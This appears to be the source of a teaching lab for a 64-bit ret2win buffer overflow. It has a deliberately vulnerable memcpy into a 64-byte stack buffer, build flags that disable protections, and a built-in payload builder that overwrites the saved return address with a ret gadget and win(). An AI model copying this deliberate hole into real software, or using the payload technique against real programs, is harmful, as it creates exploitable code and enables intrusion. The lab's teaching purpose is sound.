/*
 * main.c — bof-lab-2: 64-bit ret2win with a live, colorized stack view.
 *
 * The overflow lives in vuln() below; main() just wires up the challenge
 * and hands control to the visual.h framework (vf_repl).
 *
 * Build:
 *   gcc -O0 -g -fno-stack-protector -fno-omit-frame-pointer \
 *       -no-pie -z execstack -o vuln2 main.c
 *
 * THE GOAL
 *   ret2win: overwrite the saved return address with the address of win(),
 *   which prints /flag.txt.  On x86-64 the 16-byte ABI alignment means you
 *   must also insert a `ret` gadget before win() (see ret_gadget below).
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define VF_LABEL "bof-lab-2"
#define VF_TITLE "64-bit ret2win - interactive stack visualizer"
#define VF_BUF_SIZE 64
#include "visual.h"

/* A one-byte `ret` gadget, handed out so learners can fix the 16-byte
 * stack alignment the x86-64 ABI requires at function entry. */
__asm__(
    ".text\n"
    ".globl ret_gadget\n"
    ".type ret_gadget, @function\n"
    "ret_gadget:\n"
    "    ret\n"
    ".size ret_gadget, .-ret_gadget\n");
extern void ret_gadget(void);

void win(void)
{
    char flag[128];
    FILE *f = fopen("/flag.txt", "r");

    printf("\n" VF_BGRN VF_BOLD "******************* WIN *******************" VF_RST "\n");
    if (!f) {
        printf(VF_BRED "win() reached, but /flag.txt is missing" VF_RST "\n");
        _exit(0);
    }
    if (fgets(flag, sizeof(flag), f)) {
        char *nl = strchr(flag, '\n');
        if (nl) *nl = '\0';
        printf(VF_BGRN VF_BOLD "SECRET: %s" VF_RST "\n", flag);
    }
    fclose(f);
    printf(VF_BGRN VF_BOLD "*******************************************" VF_RST "\n");
    _exit(0);
}

/* ------------------------- the vulnerable function ------------------- */
void vuln(void)
{
    char buf[VF_BUF_SIZE];

    VF_SETUP(buf);                 /* calibrate offset, snapshot frame */

    vf_preview();                  /* visualize BEFORE overflowing     */

    if (vf_len) {
        size_t n = vf_len > VF_MAX_LEN ? VF_MAX_LEN : vf_len;
        memcpy(buf, vf_payload, n);    /* <-- the overflow             */
    }
    vf_restore(buf);               /* safe mode: undo (preview cmds)   */
}

/* ------------------------------ win payload --------------------------- */
static void build_win(unsigned char *out, size_t *out_len)
{
    size_t off = vf_eip_off, n = 0;
    uint64_t retg = (uint64_t)(uintptr_t)&ret_gadget;
    uint64_t winp = (uint64_t)(uintptr_t)&win;

    memset(out, 'A', VF_BUF_SIZE); n = VF_BUF_SIZE;
    while (n < off) out[n++] = 'B';
    memcpy(out + n, &retg, 8); n += 8;   /* alignment fix */
    memcpy(out + n, &winp, 8); n += 8;   /* saved RIP -> win() */
    *out_len = n;
}

static void banner(void)
{
    printf(VF_BOLD "  win()      = " VF_BGRN "0x%lx" VF_RST "\n",
           (unsigned long)(uintptr_t)&win);
    printf(VF_BOLD "  ret gadget = " VF_BCYN "0x%lx" VF_RST "\n",
           (unsigned long)(uintptr_t)&ret_gadget);
    printf(VF_DIM "  goal: overwrite saved RIP with win() (+ ret gadget for alignment)" VF_RST "\n");
}

int main(void)
{
    vf_banner_hook = banner;
    vf_win_builder = build_win;
    return vf_repl();
}
